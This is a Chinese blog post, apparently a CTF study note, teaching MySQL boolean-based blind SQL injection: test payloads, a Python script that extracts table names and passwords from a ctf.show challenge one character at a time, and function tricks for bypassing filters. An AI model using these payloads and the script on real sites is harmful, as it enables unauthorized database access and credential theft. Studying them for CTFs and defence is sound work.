---
layout: post
title: MySQL布尔盲注
date: 2023-08-01 10:00:00
description: MySQL布尔盲注
tags: MySQL
categories: Web安全
---

# MySQL布尔盲注

### 盲注分类

**布尔盲注：** 回显不同

**时间盲注：** 响应时间不同

***

### 布尔状态例如：

-   回显不同（内容、长度）
-   HTTP响应状态码不同（200、500）
-   HTTP响应头变化（无条件重定向、设置cookie）
-   基于错误的布尔注入（MySQL是否报错）

### 布尔盲注判断：

```sql
id=2333’ and 1=1%23 (正确状态)
id=2333’ and 1=2%23 (错误状态)
id=2333’ and ascii(substring((select database()),1,1))>-1%23 (正确状态)
id=2333’ and ascii(substring((select database()),1,1))>127%23 (错误状态)

```

&#x20;注：url中不能直接使用&、#，需要使用对应的url编码

### 来个exp：

```纯文本
import requests as req

url='http://feb7d483-9f59-476d-8880-a62bb9ff0977.challenge.ctf.show/api/v4.php?id='
urld='&page=1&limit=10'

select='select database()'
select='select group_concat(table_name) from information_schema.tables where table_schema=database()'
select="select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user4'"
select="select group_concat(password) from ctfshow_user4"

res=''
for i in range(1,100):
    for ascii in range(32,128):
        id=f"1' and ascii(right(({select}),{i}))={ascii}%23"
        try:
            r=req.get(url=url+id+urld)
            # print(r.text)
            r=r.json()
            if(r['data']!=[]):
                res=chr(ascii)+res
                print(res)
                break
            if(ascii==127):
                exit(0)
        except:
            print("time out")
```

### 盲注两大基本问题：

#### 1.字符串截取

1）substr()与substring()

SUBSTR (str, pos, len)过滤了逗号时可用SUBSTR (str FROM  pos FOR len)替代

2）limit()与1同，但其必须有三个参数

3）right() 两个参数

配合ascii()可以从右往左逐词爆破

ascii()可用ord()代替

4\)left()+reverse()

即：reverse(left('abc',2))配合ascii()即可从左往右逐词爆破

#### 高级方法

**5）trim()**

TRIM(\[BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）

```sql
select Trim(leading 'a' from 'abcd') regexp trim(LEADING 'x' from 'abcd')
#返回0
```

```sql
select Trim(leading 'c' from 'abcd') regexp trim(LEADING 'x' from 'abcd')
#返回1

```

即可得出首字母为a，然后顺推出后面

**6）insert()**

删除起始的前x位：

```sql
select insert('abcdef',1,1,'');
#bcdef
select insert('abcdef',1,2,'');
#cdef

```

套娃删除x+1位以后的所有：

```sql
select insert((insert('abcdef',1,0,'')),2,99999,'');
#a
select insert((insert('abcdef',1,1,'')),2,99999,'');
#b
```

#### 2.比较

**1)> < =**

**2)like：**

SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号 \*。
如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。

**3)正则表达式regexp rlike：**

regexp是不区分大小写的，需要大小写敏感需要加上binary关键字

**4）between：**

```sql
expr [NOT] BETWEEN begin_expr AND end_expr;
```

between筛选的是 expr >= begin\_expr并且 expr <= end\_expr 的数据，如果不存
在则返回的是0；

not between筛选的是 expr < begin\_expr或者 expr > end\_expr 的数据，如果不
存在则返回的是0；

如果 expr 返回的是 NULL，则between 也返回的是null

**5）in**：

加binary可变为大小写敏感

**6）and  逻辑与运算符**

**7）&&  逻辑与运算 和and一样**

**&  按位与运算**

**8）||等价于or**

**|按位或**

**9）Xor 逻辑异或**

**^按位异或**

异或注入：当#与—+被注释时可以考虑

1'-()-' 与 连等也可

**10）order by 比较盲注**

```sql
select * from users where (select 'a' union select substr(group_concat(password),1,1) from users where username='admin' order 
by 1 limit 1)='a';

```

**11）case与if**
